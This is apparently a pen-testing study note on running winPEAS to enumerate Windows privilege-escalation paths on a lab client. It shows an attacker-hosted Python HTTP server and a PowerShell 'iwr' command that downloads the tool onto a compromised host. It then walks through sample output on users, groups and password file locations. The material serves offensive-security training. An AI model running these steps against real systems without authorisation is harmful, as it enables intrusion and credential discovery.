
# Automated Enumeration
In actual pen-tests, we should automated tools for enumeration since we are time-boxed. A good choice for enumerating Windows, especially as it relates to privesc, is [_winPEAS_](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).
## WinPEAS
To use winPEAS, we first need to get the binary onto our target box.
### Infiltrating WinPEAS
First, we need to install the [`peass`](https://www.kali.org/tools/peass-ng/)package (on our Kali machine). Then we can download the 64-bit binary for WinPEAS onto our attacking machine, then we can use [python](../../../coding/languages/python/python.md) to serve it via an [HTTP](../../../www/HTTP.md) server:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Once that's up and listening for connections, we can user [powershell](../../../computers/windows/powershell.md) to access it from the target box we compromised. After starting a PS session, we can use `iwr` with the `-uri` flag set to the address of our python web server. `iwr` is a cmdlet:
```powershell
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```
If everything works, this will send an HTTP `GET` request to our python server for the winPEAS binary and then download it into our working directory.
### Running WinPEAS
Once we run winPEAS it will take a few minutes to finish since it's doing all of the enumeration for us. The output will be color-coded:
- Red: special privilege over an object or a misconfiguration
- Green: protection is enabled
- Cyan: active users
- Blue: disabled users
- Light Yellow: links

To run winPEAS, the command is `.\winPEAS.exe`. Here is some output for the example client `CLIENTWK220` like we've been using throughout this section (see [sensitive-files](sensitive-files.md), [enumeration](enumeration.md), and [powershell-logging](powershell-logging.md)). 
#### System Info
The first part of the output includes basic information about the system:
```powershell
...
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits    OS Name: Microsoft Windows 11 Pro
    OS Version: 10.0.22621 N/A Build 22621
    System Type: x64-based PC
    Hostname: clientwk220
    ProductName: Windows 10 Pro
    EditionID: Professional
    ReleaseId: 2009
    BuildBranch: ni_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 9/2/2024 11:03:33 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: 
...
```
Note that winPEAS has the OS version as Windows 10 Pro instead of Windows 11 Pro like we confirmed earlier. This is a good example of why *you should never fully trust output from an automated tool*.
#### Security Protections
The next section of output includes security protections in place like [NTLM](../../../networking/protocols/NTLM.md) settings. Here we can see info related to [PowerShell Transcription](powershell-logging.md#PowerShell%20Transcription) files:
```powershell
...    
����������͹ PS default transcripts history
� Read the PS history inside these files (if any)
...
```
Note that again, winPEAS got it wrong *since we know there is a transcript file* in `C:\Users\Public`
#### Users & Groups
The next section pertains to users on the system including the groups they're members of:
```powershell
����������͹ Users
...    
Current user: dave
Current groups: Domain Users, Everyone, helpdesk, Builtin\Remote Desktop Users, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication

   CLIENTWK220\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\BackupAdmin
        |->Groups: BackupUsers,Administrators,Users
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\dave: dave
        |->Groups: helpdesk,Remote Desktop Users,Users
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\daveadmin
        |->Groups: adminteam,Administrators,Remote Management Users,Users
        |->Password: CanChange-NotExpi-Req
...

    CLIENTWK220\steve
        |->Groups: helpdesk,Remote Desktop Users,Remote Management Users,Users
        |->Password: CanChange-NotExpi-Req
...
```
#### Processes, Services, Tasks, Network, Applications
The next section includes info on currently running processes, scheduled tasks, services, network information, and applications.
#### Password Files
The last section includes any discovered password and password-related files found in user home directories:
```powershell
...    
����������͹ Looking for possible password files in users homes
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\dave\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
    C:\Users\dave\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
...
```
Again, the output doesn't include `asdf.txt` which we found in `dave`'s Desktop folder before.


> [!Resources]
> - [_winPEAS_](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
> - [**peass**](https://www.kali.org/tools/peass-ng/) package